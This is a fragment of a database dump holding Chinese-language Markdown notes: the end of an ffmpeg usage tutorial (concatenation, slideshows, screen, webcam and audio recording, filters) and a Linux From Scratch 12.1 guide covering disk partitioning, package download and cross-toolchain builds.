00:00:30)。\r\n\r\n你可以任意指定多少个部分，尝试一下吧，这个功能真的很厉害，同时它也适用用音频文件。\r\n\r\n### 5.2 拼接媒体文件\r\nffmpeg 也可以进行相反的动作：把多个文件合在一起。\r\n\r\n为了实现这一点，你得用自己顺手的编辑器来创建一个文本文件。\r\n\r\n因为我喜欢使用终端，所以这里我用了 touch 和 vim. 文件名无关紧要，这里我用 touch 命令创建 video_to_join.txt 文件:\r\n\r\ntouch videos_to_join.txt\r\n现在，使用 vim 编辑它:\r\n\r\nvim videos_to_join.txt\r\n你可以使用任何你喜欢的工具，比如nano，gedit等等。\r\n\r\n在文件内容中, 输入您想拼接的文件的完整路径（文件会按照顺序拼合在一起），一行一个文件。确保他们拥有相同的后缀名。下面是我的例子：\r\n```\r\n/home/ubuntu/Desktop/video_1.mp4\r\n/home/ubuntu/Desktop/video_2.mp4\r\n/home/ubuntu/Desktop/video_3.mp4\r\n```\r\n保存这个文件，同样这个方法适用与任何音频或者视频文件。\r\n\r\n然后使用下面的命令：\r\n```\r\nffmpeg -f concat -i join.txt output.mp4\r\n```\r\n\r\n这样，你 videos_to_join.txt 里的所有文件都会被拼接成一个独立的文件了。\r\n\r\n### 5.3 将图片转变为视频\r\n这会告诉你如何将图片变成幻灯片秀，同时也会告诉你如何加上音频。\r\n\r\n首先我建议您将所有的图片放到一个文件夹下面，我把它们放到了 my_photos 里，同时图片的后缀名最好是 .png 或者 .jpg， 不管选那个，他们应该是同一个后缀名，否则ffmpeg可能会工作的不正常，您可以很方便的把 .png 转变为 .jpg （或者倒过来也行）。\r\n\r\n我们这次转换的格式 (-f) 应该被设置为 image2pipe. 你必须使用使用连词符(–)来指明输入。 image2pipe 允许你使用管道 (在命令间使用 |)的结果而不是文件作为ffmpeg的输入。命令结果便是将所有图片的内容逐个输出，还要注意指明视频编码器是 copy (-c:v copy) 以正确使用图片输入：\r\n```\r\ncat my_photos/* | ffmpeg -f image2pipe -i - -c:v copy video.mkv\r\n```\r\n如果你播放这个文件，你可能会觉得只有一部分图片被加入了，事实上所有的图片都在，但是ffmpeg 播放它们的时候太快了，默认是23fps，一秒播放了23张图片。\r\n\r\n你应该指定帧率 (-framerate) :\r\n```\r\ncat my_photos/* | ffmpeg -framerate 1 -f image2pipe -i - -c:v copy video.mkv\r\n```\r\n在这个例子里，把帧率设置为1，也就是每帧（每张图）会显示1秒。\r\n\r\n为了加一些声音，可以使用音频文件作为输入 (-i audo_file) 并且设定copy音频编码 (-c:a copy). 你可以同时为音频和视频设定编码器，在输出文件前设置就可以了。你要计算一下音频文件的长度和图片张数，已确定合适的帧率。比如我的音频文件是22秒，图片有9张，那么帧率应该是 9 / 22 大约0.4，所以我这么输入命令：\r\n```\r\ncat my_photos/* | ffmpeg -framerate 0.40 -f image2pipe -i - -i audio.wav -c copy video.mkv\r\n```\r\n### 5.4 录制屏幕\r\n通过 ffmpeg 录制屏幕同样没有困难的，将格式(-f) 设定为x11grab. 他就会抓取你的XSERVER. 输入的话可以这是屏幕编号（一般都是0:0). 抓取是从左上角开始计算的，可以指定屏幕分辨率 (-s). 我的屏幕是 1920×1080. 注意屏幕分辨率硬在输入之前指定t:\r\n```\r\nffmpeg -f x11grab -s 1920x1080 -i :0.0 output.mp4\r\n```\r\n按 q 或者 CTRL+C 以结束录制屏幕。\r\n\r\n-s $(xdpyinfo | grep dimensions | awk \'{print $2;}\')\r\n完整的命令这么写:\r\n```\r\nffmpeg -f x11grab -s $(xdpyinfo | grep dimensions | awk \'{print $2;}\') -i :0.0 output.mp4\r\n```\r\n### 5.5 录制摄像头\r\n从摄像头录制就更简单了，linux上设备都是在/dev中的，比如 /dev/video0, /dev/video1, etc.:\r\n```\r\nffmpeg -i /dev/video0 output.mkv\r\n```\r\n同样, q 或者 CTRL+C 来结束录制。\r\n\r\n### 5.6 录制声音\r\nLinux上同时是使用 ALSA 和 pulseaudio 来处理声音的。 ffmpeg 可以录制两者，不过我要特别说明 pulseaudio, 因为 Debian 系列的发行版默认用了它。命令如下：\r\n\r\n在 pulseaudio, 你必须强制指定(-f) alsa 然后指定 default 作为输入t (-i default):\r\n```\r\nffmpeg -f alsa -i default output.mp3\r\n```\r\n\r\n录制小贴士\r\n对于录制任务来说，通常都需要指定编码器以及帧率，之前讲过的参数当然也可以用到这里来！\r\n```\r\nffmpeg -i /dev/video0 -f alsa -i default -c:v libx264 -c:a flac -r 30 output.mkv\r\n```\r\n有时候不直接录音，而是在录屏/录像的时候给一个音频文件，那么可以这么做：\r\n```\r\nffmpeg -f x11grab -s $(xdpyinfo | grep dimensions | awk \'{print $2;}\') -i :0.0 -i audio.wav -c:a copy output.mp4\r\n```\r\n\r\nffmpeg中的过滤器的基本使用\r\n过滤器 是 ffmpeg 中最为强大的功能。在ffmepg中有数不甚数的过滤器存在，可以满足各种编辑需要。因为过滤器实在太多了，这里只会简单讲述几个常用的。\r\n\r\n使用 过滤的基本结构是:\r\n\r\nffmpeg -i input.mp4 -vf \"filter=setting_1=value_1:setting_2=value_2,etc\" output.mp4\r\nffmpeg -i input.wav -af \"filter=setting_1=value_1:setting_2=value_2,etc\" output.wav\r\n可以指定视频过滤器 (-vf, -filter:v的简写) 和 音频过滤器 (-af, -filter:a的简写). 过滤器的内容写到双引号里面 (“) 并且可以使用逗号(,)连接。你可以使用任意数量的过滤器（我写了个etc代表更多的，这不是做一个真实的过滤器）。\r\n\r\n过滤器设定的通常格式是:\r\n\r\nfilter=setting_2=value_2:setting_2=value_2\r\n过滤器不同的值使用冒号分割。\r\n\r\n你甚至可以在值里面使用进行数学符号计算。\r\n','2024-03-11 14:51:40','2024-03-12 12:18:02'),(100013,100000,'Linux From Scratch','## Linux From Scratch\r\n\r\n### 准备宿主系统\r\n\r\n#### 宿主系统需求\r\n\r\n```sh\r\ncat > version-check.sh << \"EOF\"\r\n#!/bin/bash\r\n# A script to list version numbers of critical development tools\r\n\r\n# If you have tools installed in other directories, adjust PATH here AND\r\n# in ~lfs/.bashrc (section 4.4) as well.\r\n\r\nLC_ALL=C \r\nPATH=/usr/bin:/bin\r\n\r\nbail() { echo \"FATAL: $1\"; exit 1; }\r\ngrep --version > /dev/null 2> /dev/null || bail \"grep does not work\"\r\nsed \'\' /dev/null || bail \"sed does not work\"\r\nsort   /dev/null || bail \"sort does not work\"\r\n\r\nver_check()\r\n{\r\n   if ! type -p $2 &>/dev/null\r\n   then \r\n     echo \"ERROR: Cannot find $2 ($1)\"; return 1; \r\n   fi\r\n   v=$($2 --version 2>&1 | grep -E -o \'[0-9]+\\.[0-9\\.]+[a-z]*\' | head -n1)\r\n   if printf \'%s\\n\' $3 $v | sort --version-sort --check &>/dev/null\r\n   then \r\n     printf \"OK:    %-9s %-6s >= $3\\n\" \"$1\" \"$v\"; return 0;\r\n   else \r\n     printf \"ERROR: %-9s is TOO OLD ($3 or later required)\\n\" \"$1\"; \r\n     return 1; \r\n   fi\r\n}\r\n\r\nver_kernel()\r\n{\r\n   kver=$(uname -r | grep -E -o \'^[0-9\\.]+\')\r\n   if printf \'%s\\n\' $1 $kver | sort --version-sort --check &>/dev/null\r\n   then \r\n     printf \"OK:    Linux Kernel $kver >= $1\\n\"; return 0;\r\n   else \r\n     printf \"ERROR: Linux Kernel ($kver) is TOO OLD ($1 or later required)\\n\" \"$kver\"; \r\n     return 1; \r\n   fi\r\n}\r\n\r\n# Coreutils first because --version-sort needs Coreutils >= 7.0\r\nver_check Coreutils      sort     8.1 || bail \"Coreutils too old, stop\"\r\nver_check Bash           bash     3.2\r\nver_check Binutils       ld       2.13.1\r\nver_check Bison          bison    2.7\r\nver_check Diffutils      diff     2.8.1\r\nver_check Findutils      find     4.2.31\r\nver_check Gawk           gawk     4.0.1\r\nver_check GCC            gcc      5.2\r\nver_check \"GCC (C++)\"    g++      5.2\r\nver_check Grep           grep     2.5.1a\r\nver_check Gzip           gzip     1.3.12\r\nver_check M4             m4       1.4.10\r\nver_check Make           make     4.0\r\nver_check Patch          patch    2.5.4\r\nver_check Perl           perl     5.8.8\r\nver_check Python         python3  3.4\r\nver_check Sed            sed      4.1.5\r\nver_check Tar            tar      1.22\r\nver_check Texinfo        texi2any 5.0\r\nver_check Xz             xz       5.0.0\r\nver_kernel 4.19\r\n\r\nif mount | grep -q \'devpts on /dev/pts\' && [ -e /dev/ptmx ]\r\nthen echo \"OK:    Linux Kernel supports UNIX 98 PTY\";\r\nelse echo \"ERROR: Linux Kernel does NOT support UNIX 98 PTY\"; fi\r\n\r\nalias_check() {\r\n   if $1 --version 2>&1 | grep -qi $2\r\n   then printf \"OK:    %-4s is $2\\n\" \"$1\";\r\n   else printf \"ERROR: %-4s is NOT $2\\n\" \"$1\"; fi\r\n}\r\necho \"Aliases:\"\r\nalias_check awk GNU\r\nalias_check yacc Bison\r\nalias_check sh Bash\r\n\r\necho \"Compiler check:\"\r\nif printf \"int main(){}\" | g++ -x c++ -\r\nthen echo \"OK:    g++ works\";\r\nelse echo \"ERROR: g++ does NOT work\"; fi\r\nrm -f a.out\r\n\r\nif [ \"$(nproc)\" = \"\" ]; then\r\n   echo \"ERROR: nproc is not available or it produces empty output\"\r\nelse\r\n   echo \"OK: nproc reports $(nproc) logical cores are available\"\r\nfi\r\nEOF\r\n\r\nchmod 755 version-check.sh\r\n\r\nbash version-check.sh\r\n```\r\n\r\n#### 创建新的分区\r\n\r\n```sh\r\ncfdisk /dev/sda\r\n```\r\n\r\n> `/dev/sda1` `512M`\r\n>\r\n> `/dev/sda2` `16G`\r\n>\r\n> `/dev/sda3` `ALL`\r\n\r\n#### 在分区上建立文件系统\r\n\r\n```sh\r\nmkfs.vfat -v -F 32 /dev/sda1\r\nmkswap /dev/sda2\r\nmkfs.ext4 -v /dev/sda3\r\n```\r\n\r\n#### 设置 $LFS 环境变量\r\n\r\n```sh\r\nexport LFS=/mnt/lfs\r\necho $LFS\r\n```\r\n\r\n#### 挂载新的分区\r\n\r\n```sh\r\nmkdir -pv $LFS\r\nmount -v /dev/sda3 $LFS\r\nswapon -v /dev/sda2\r\nmkdir -pv $LFS/boot/efi\r\nmount -v /dev/sda1 $LFS/boot/efi\r\nlsblk\r\n```\r\n\r\n> 修复\r\n>\r\n> ```sh\r\n> export LFS=/mnt/lfs\r\n> echo $LFS\r\n> mkdir -pv $LFS\r\n> mount -v /dev/sda3 $LFS\r\n> mount -v /dev/sda1 $LFS/boot/efi\r\n> ```\r\n>\r\n> \r\n>\r\n> 重新进入lfs\r\n>\r\n> ```sh\r\n> mount -v --bind /dev $LFS/dev\r\n> \r\n> mount -vt devpts devpts -o gid=5,mode=0620 $LFS/dev/pts\r\n> mount -vt proc proc $LFS/proc\r\n> mount -vt sysfs sysfs $LFS/sys\r\n> mount -vt tmpfs tmpfs $LFS/run\r\n> \r\n> if [ -h $LFS/dev/shm ]; then\r\n> install -v -d -m 1777 $LFS$(realpath /dev/shm)\r\n> else\r\n> mount -vt tmpfs -o nosuid,nodev tmpfs $LFS/dev/shm\r\n> fi\r\n> \r\n> chroot \"$LFS\" /usr/bin/env -i   \\\r\n>  HOME=/root                  \\\r\n>  TERM=\"$TERM\"                \\\r\n>  PS1=\'(lfs chroot) \\u:\\w\\$ \' \\\r\n>  PATH=/usr/bin:/usr/sbin     \\\r\n>  MAKEFLAGS=\"-j$(nproc)\"      \\\r\n>  TESTSUITEFLAGS=\"-j$(nproc)\" \\\r\n>  /bin/bash --login\r\n> ```\r\n\r\n### 软件包和补丁\r\n\r\n#### 概述\r\n\r\n```sh\r\nmkdir -v $LFS/sources\r\nchmod -v a+wt $LFS/sources\r\n```\r\n\r\n> 获取需要的软件包\r\n>\r\n> `wget https://mirrors.ustc.edu.cn/lfs/lfs-packages/lfs-packages-12.1.tar`\r\n>\r\n> 解压后将压缩包里面的内容移动到`$LFS/sources/`里面\r\n>\r\n> `tar -xf lfs-packages-12.1.tar`\r\n>\r\n> `mv 12.1/* $LFS/sources/`\r\n>\r\n> `rm -rf 12.1 lfs-packages-12.1.tar`\r\n\r\n>下载用于UEFI的GRUB依赖\r\n>\r\n>`cd $LFS/sources`\r\n>\r\n>`wget https://github.com/rhboot/efivar/archive/39/efivar-39.tar.gz`\r\n>`wget http://ftp.rpm.org/popt/releases/popt-1.x/popt-1.19.tar.gz`\r\n>`wget https://github.com/rhboot/efibootmgr/archive/18/efibootmgr-18.tar.gz`\r\n>\r\n>\r\n\r\n```sh\r\npushd $LFS/sources\r\nmd5sum -c md5sums\r\npopd\r\n\r\nchown root:root $LFS/sources/*\r\n```\r\n\r\n### 最后准备工作\r\n\r\n#### 在 LFS 文件系统中创建有限目录布局\r\n\r\n```sh\r\nmkdir -pv $LFS/{etc,var} $LFS/usr/{bin,lib,sbin}\r\n\r\ncd $LFS\r\nfor i in bin lib sbin; do\r\n  ln -sv usr/$i $LFS/$i\r\ndone\r\n\r\ncase $(uname -m) in\r\n  x86_64) mkdir -pv $LFS/lib64 ;;\r\nesac\r\n\r\nmkdir -pv $LFS/tools\r\n```\r\n\r\n#### 添加LFS用户\r\n\r\n```sh\r\ngroupadd lfs\r\nuseradd -s /bin/bash -g lfs -m -k /dev/null lfs\r\npasswd lfs\r\n\r\nchown -v lfs $LFS/{usr{,/*},lib,var,etc,bin,sbin,tools}\r\ncase $(uname -m) in\r\n  x86_64) chown -v lfs $LFS/lib64 ;;\r\nesac\r\n\r\nsu - lfs\r\n```\r\n\r\n#### 配置环境\r\n\r\n```sh\r\ncat > ~/.bash_profile << \"EOF\"\r\nexec env -i HOME=$HOME TERM=$TERM PS1=\'\\u:\\w\\$ \' /bin/bash\r\nEOF\r\n\r\ncat > ~/.bashrc << \"EOF\"\r\nset +h\r\numask 022\r\nLFS=/mnt/lfs\r\nLC_ALL=POSIX\r\nLFS_TGT=$(uname -m)-lfs-linux-gnu\r\nPATH=/usr/bin\r\nif [ ! -L /bin ]; then PATH=/bin:$PATH; fi\r\nPATH=$LFS/tools/bin:$PATH\r\nCONFIG_SITE=$LFS/usr/share/config.site\r\nexport LFS LC_ALL LFS_TGT PATH CONFIG_SITE\r\nEOF\r\n\r\nsu\r\n[ ! -e /etc/bash.bashrc ] || mv -v /etc/bash.bashrc /etc/bash.bashrc.NOUSE\r\nsu - lfs\r\n\r\ncat >> ~/.bashrc << \"EOF\"\r\nexport MAKEFLAGS=-j$(nproc)\r\nEOF\r\nsource ~/.bash_profile\r\n```\r\n\r\n### 构建 LFS 交叉工具链和临时工具\r\n\r\n#### Binutils-2.42- 第一遍\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf binutils-2.42.tar.xz \r\ncd binutils-2.42 \r\n\r\nmkdir -v build\r\ncd build\r\n\r\n../configure --prefix=$LFS/tools \\\r\n             --with-sysroot=$LFS \\\r\n             --target=$LFS_TGT   \\\r\n             --disable-nls       \\\r\n             --enable-gprofng=no \\\r\n             --disable-werror    \\\r\n             --enable-default-hash-style=gnu\r\n             \r\nmake\r\nmake install\r\n\r\ncd $LFS/sources\r\nrm -rf binutils-2.42\r\n```\r\n\r\n####  GCC-13.2.0 - 第一遍\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf gcc-13.2.0.tar.xz\r\ncd gcc-13.2.0\r\n\r\ntar -xf ../mpfr-4.2.1.tar.xz\r\nmv -v mpfr-4.2.1 mpfr\r\ntar -xf ../gmp-6.3.0.tar.xz\r\nmv -v gmp-6.3.0 gmp\r\ntar -xf ../mpc-1.3.1.tar.gz\r\nmv -v mpc-1.3.1 mpc\r\n\r\ncase $(uname -m) in\r\n  x86_64)\r\n    sed -e \'/m64=/s/lib64/lib/\' \\\r\n        -i.orig gcc/config/i386/t-linux64\r\n ;;\r\nesac\r\n\r\nmkdir -v build\r\ncd build\r\n\r\n../configure                  \\\r\n    --target=$LFS_TGT         \\\r\n    --prefix=$LFS/tools       \\\r\n    --with-glibc-version=2.39 \\\r\n    --with-sysroot=$LFS       \\\r\n    --with-newlib             \\\r\n    --without-headers         \\\r\n    --enable-default-pie      \\\r\n    --enable-default-ssp      \\\r\n    --disable-nls             \\\r\n    --disable-shared          \\\r\n    --disable-multilib        \\\r\n    --disable-threads         \\\r\n    --disable-libatomic       \\\r\n    --disable-libgomp         \\\r\n    --disable-libquadmath     \\\r\n    --disable-libssp          \\\r\n    --disable-libvtv          \\\r\n    --disable-libstdcxx       \\\r\n    --enable-languages=c,c++\r\n    \r\nmake\r\nmake install\r\n\r\ncd ..\r\ncat gcc/limitx.h gcc/glimits.h gcc/limity.h > \\\r\n  `dirname $($LFS_TGT-gcc -print-libgcc-file-name)`/include/limits.h\r\n  \r\ncd $LFS/sources\r\nrm -rf gcc-13.2.0\r\n```\r\n\r\n#### Linux-6.7.4 API 头文件\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf linux-6.7.4.tar.xz\r\ncd linux-6.7.4\r\n\r\nmake mrproper\r\n\r\nmake headers\r\nfind usr/include -type f ! -name \'*.h\' -delete\r\ncp -rv usr/include $LFS/usr\r\n\r\ncd $LFS/sources\r\nrm -rf linux-6.7.4\r\n```\r\n\r\n#### Glibc-2.39\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf glibc-2.39.tar.xz \r\ncd glibc-2.39\r\n\r\ncase $(uname -m) in\r\n    i?86)   ln -sfv ld-linux.so.2 $LFS/lib/ld-lsb.so.3\r\n    ;;\r\n    x86_64) ln -sfv ../lib/ld-linux-x86-64.so.2 $LFS/lib64\r\n            ln -sfv ../lib/ld-linux-x86-64.so.2 $LFS/lib64/ld-lsb-x86-64.so.3\r\n    ;;\r\nesac\r\n\r\npatch -Np1 -i ../glibc-2.39-fhs-1.patch\r\n\r\nmkdir -v build\r\ncd build\r\n\r\necho \"rootsbindir=/usr/sbin\" > configparms\r\n\r\n../configure                             \\\r\n      --prefix=/usr                      \\\r\n      --host=$LFS_TGT                    \\\r\n      --build=$(../scripts/config.guess) \\\r\n      --enable-kernel=4.19               \\\r\n      --with-headers=$LFS/usr/include    \\\r\n      --disable-nscd                     \\\r\n      libc_cv_slibdir=/usr/lib\r\n      \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\nsed \'/RTLDLIST=/s@/usr@@g\' -i $LFS/usr/bin/ldd\r\n\r\ncd $LFS/sources\r\nrm -rf glibc-2.39\r\n```\r\n\r\n#### GCC-13.2.0 中的 Libstdc++\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf gcc-13.2.0.tar.xz\r\ncd gcc-13.2.0\r\n\r\ntar -xf ../mpfr-4.2.1.tar.xz\r\nmv -v mpfr-4.2.1 mpfr\r\ntar -xf ../gmp-6.3.0.tar.xz\r\nmv -v gmp-6.3.0 gmp\r\ntar -xf ../mpc-1.3.1.tar.gz\r\nmv -v mpc-1.3.1 mpc\r\n\r\nmkdir -v build\r\ncd build\r\n\r\n../libstdc++-v3/configure           \\\r\n    --host=$LFS_TGT                 \\\r\n    --build=$(../config.guess)      \\\r\n    --prefix=/usr                   \\\r\n    --disable-multilib              \\\r\n    --disable-nls                   \\\r\n    --disable-libstdcxx-pch         \\\r\n    --with-gxx-include-dir=/tools/$LFS_TGT/include/c++/13.2.0\r\n    \r\nmake\r\nmake DESTDIR=$LFS install\r\nrm -v $LFS/usr/lib/lib{stdc++{,exp,fs},supc++}.la\r\n\r\ncd $LFS/sources\r\nrm -rf gcc-13.2.0\r\n```\r\n\r\n#### M4-1.4.19\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf m4-1.4.19.tar.xz\r\ncd m4-1.4.19\r\n\r\n./configure --prefix=/usr   \\\r\n            --host=$LFS_TGT \\\r\n            --build=$(build-aux/config.guess)\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf m4-1.4.19\r\n```\r\n\r\n#### Ncurses-6.4-20230520\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf ncurses-6.4-20230520.tar.xz \r\ncd ncurses-6.4-20230520\r\n\r\nsed -i s/mawk// configure\r\n\r\nmkdir build\r\npushd build\r\n  ../configure\r\n  make -C include\r\n  make -C progs tic\r\npopd\r\n\r\n./configure --prefix=/usr                \\\r\n            --host=$LFS_TGT              \\\r\n            --build=$(./config.guess)    \\\r\n            --mandir=/usr/share/man      \\\r\n            --with-manpage-format=normal \\\r\n            --with-shared                \\\r\n            --without-normal             \\\r\n            --with-cxx-shared            \\\r\n            --without-debug              \\\r\n            --without-ada                \\\r\n            --disable-stripping          \\\r\n            --enable-widec\r\n            \r\nmake\r\nmake DESTDIR=$LFS TIC_PATH=$(pwd)/build/progs/tic install\r\n\r\nln -sv libncursesw.so $LFS/usr/lib/libncurses.so\r\nsed -e \'s/^#if.*XOPEN.*$/#if 1/\' \\\r\n    -i $LFS/usr/include/curses.h\r\n    \r\ncd $LFS/sources\r\nrm -rf ncurses-6.4-20230520\r\n```\r\n\r\n#### Bash-5.2.21\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf bash-5.2.21.tar.gz\r\ncd bash-5.2.21\r\n\r\n./configure --prefix=/usr                      \\\r\n            --build=$(sh support/config.guess) \\\r\n            --host=$LFS_TGT                    \\\r\n            --without-bash-malloc\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\nln -sv bash $LFS/bin/sh\r\n\r\ncd $LFS/sources\r\nrm -rf bash-5.2.21\r\n```\r\n\r\n#### Coreutils-9.4\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf coreutils-9.4.tar.xz\r\ncd coreutils-9.4\r\n\r\n./configure --prefix=/usr                     \\\r\n            --host=$LFS_TGT                   \\\r\n            --build=$(build-aux/config.guess) \\\r\n            --enable-install-program=hostname \\\r\n            --enable-no-install-program=kill,uptime\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\nmv -v $LFS/usr/bin/chroot              $LFS/usr/sbin\r\nmkdir -pv $LFS/usr/share/man/man8\r\nmv -v $LFS/usr/share/man/man1/chroot.1 $LFS/usr/share/man/man8/chroot.8\r\nsed -i \'s/\"1\"/\"8\"/\'                   $LFS/usr/share/man/man8/chroot.8\r\n\r\ncd $LFS/sources\r\nrm -rf coreutils-9.4\r\n```\r\n\r\n#### Diffutils-3.10\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf diffutils-3.10.tar.xz\r\ncd diffutils-3.10\r\n\r\n./configure --prefix=/usr   \\\r\n            --host=$LFS_TGT \\\r\n            --build=$(./build-aux/config.guess)\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf diffutils-3.10\r\n```\r\n\r\n#### File-5.45\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf file-5.45.tar.gz\r\ncd file-5.45\r\n\r\nmkdir build\r\npushd build\r\n  ../configure --disable-bzlib      \\\r\n               --disable-libseccomp \\\r\n               --disable-xzlib      \\\r\n               --disable-zlib\r\n  make\r\npopd\r\n\r\n./configure --prefix=/usr --host=$LFS_TGT --build=$(./config.guess)\r\n\r\nmake FILE_COMPILE=$(pwd)/build/src/file\r\n\r\nmake DESTDIR=$LFS install\r\n\r\nrm -v $LFS/usr/lib/libmagic.la\r\n\r\ncd $LFS/sources\r\nrm -rf file-5.45\r\n```\r\n\r\n#### Findutils-4.9.0\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf findutils-4.9.0.tar.xz\r\ncd findutils-4.9.0\r\n\r\n./configure --prefix=/usr                   \\\r\n            --localstatedir=/var/lib/locate \\\r\n            --host=$LFS_TGT                 \\\r\n            --build=$(build-aux/config.guess)\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf findutils-4.9.0\r\n```\r\n\r\n#### Gawk-5.3.0\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf gawk-5.3.0.tar.xz \r\ncd gawk-5.3.0\r\n\r\nsed -i \'s/extras//\' Makefile.in\r\n\r\n./configure --prefix=/usr   \\\r\n            --host=$LFS_TGT \\\r\n            --build=$(build-aux/config.guess)\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf gawk-5.3.0\r\n```\r\n\r\n#### Grep-3.11\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf grep-3.11.tar.xz\r\ncd grep-3.11\r\n\r\n./configure --prefix=/usr   \\\r\n            --host=$LFS_TGT \\\r\n            --build=$(./build-aux/config.guess)\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf grep-3.11\r\n```\r\n\r\n#### Gzip-1.13\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf gzip-1.13.tar.xz \r\ncd gzip-1.13\r\n\r\n./configure --prefix=/usr --host=$LFS_TGT\r\n\r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf gzip-1.13\r\n```\r\n\r\n#### Make-4.4.1\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf make-4.4.1.tar.gz\r\ncd make-4.4.1\r\n\r\n./configure --prefix=/usr   \\\r\n            --without-guile \\\r\n            --host=$LFS_TGT \\\r\n            --build=$(build-aux/config.guess)\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf make-4.4.1\r\n```\r\n\r\n#### Patch-2.7.6\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf patch-2.7.6.tar.xz\r\ncd patch-2.7.6\r\n\r\n./configure --prefix=/usr   \\\r\n            --host=$LFS_TGT \\\r\n            --build=$(build-aux/config.guess)\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf patch-2.7.6\r\n```\r\n\r\n#### Sed-4.9\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf sed-4.9.tar.xz\r\ncd sed-4.9\r\n\r\n./configure --prefix=/usr   \\\r\n            --host=$LFS_TGT \\\r\n            --build=$(./build-aux/config.guess)\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf sed-4.9\r\n```\r\n\r\n#### Tar-1.35\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf tar-1.35.tar.xz\r\ncd tar-1.35\r\n\r\n./configure --prefix=/usr                     \\\r\n            --host=$LFS_TGT                   \\\r\n            --build=$(build-aux/config.guess)\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\n\r\ncd $LFS/sources\r\nrm -rf tar-1.35\r\n```\r\n\r\n#### Xz-5.4.6\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf xz-5.4.6.tar.xz\r\ncd xz-5.4.6\r\n\r\n./configure --prefix=/usr                     \\\r\n            --host=$LFS_TGT                   \\\r\n            --build=$(build-aux/config.guess) \\\r\n            --disable-static                  \\\r\n            --docdir=/usr/share/doc/xz-5.4.6\r\n            \r\nmake\r\nmake DESTDIR=$LFS install\r\nrm -v $LFS/usr/lib/liblzma.la\r\n\r\ncd $LFS/sources\r\nrm -rf xz-5.4.6\r\n```\r\n\r\n#### Binutils-2.42 - 第二遍\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf binutils-2.42.tar.xz\r\ncd binutils-2.42\r\n\r\nsed \'6009s/$add_dir//\' -i ltmain.sh\r\n\r\nmkdir -v build\r\ncd build\r\n\r\n../configure                   \\\r\n    --prefix=/usr              \\\r\n    --build=$(../config.guess) \\\r\n    --host=$LFS_TGT            \\\r\n    --disable-nls              \\\r\n    --enable-shared            \\\r\n    --enable-gprofng=no        \\\r\n    --disable-werror           \\\r\n    --enable-64-bit-bfd        \\\r\n    --enable-default-hash-style=gnu\r\n    \r\nmake\r\nmake DESTDIR=$LFS install\r\nrm -v $LFS/usr/lib/lib{bfd,ctf,ctf-nobfd,opcodes,sframe}.{a,la}\r\n\r\ncd $LFS/sources\r\nrm -rf binutils-2.42\r\n```\r\n\r\n#### GCC-13.2.0 - 第二遍\r\n\r\n```sh\r\ncd $LFS/sources\r\ntar -xf gcc-13.2.0.tar.xz\r\ncd gcc-13.2.0\r\n\r\nrm -rf mpfr gmp mpc\r\ntar -xf ../mpfr-4.2.1.tar.xz\r\nmv -v mpfr-4.2.1 mpfr\r\ntar -xf ../gmp-6.3.0.tar.xz\r\nmv -v gmp-6.3.0 gmp\r\ntar -xf ../mpc-1.3.1.tar.gz\r\nmv -v mpc-1.3.1 mpc\r\n\r\ncase $(uname -m) in\r\n  x86_64)\r\n    sed -e \'/m64=/s/lib64/lib/\' \\\r\n        -i.orig gcc/config/i386/t-linux64\r\n  ;;\r\nesac\r\n\r\nsed \'/thread_header =/s/@.*@/gthr-posix.h/\' \\\r\n    -i libgcc/Makefile.in libstdc++-v3/include/Makefile.in\r\n\r\nmkdir -v build\r\ncd build\r\n\r\n../configure                                       \\\r\n    --build=$(../config.guess)                     \\\r\n    --host=$LFS_TGT                                \\\r\n    --target=$LFS_TGT                              \\\r\n    LDFLAGS_FOR_TARGET=-L$PWD/$LFS_TGT/libgcc      \\\r\n    --prefix=/usr                                  \\\r\n    --with-build-sysroot=$LFS                      \\\r\n    --enable-default-pie                           \\\r\n    --enable-default-ssp                           \\\r\n    --disable-nls                                  \\\r\n    --disable-multilib                             \\\r\n    --disable-libatomic                            \\\r\n    --disable-libgomp                              \\\r\n    --disable-libquadmath                          \\\r\n    --disable-libsanitizer                         \\\r\n    --disable-libssp                               \\\r\n    --disable-libvtv                               \\\r\n    --enable-languages=c,c++\r\n    \r\nmake\r\nmake DESTDIR=$LFS install\r\nln -sv gcc $LFS/usr/bin/cc\r\n\r\ncd $LFS/sources\r\nrm -rf gcc-13.2.0\r\n```\r\n\r\n### 进入 Chroot 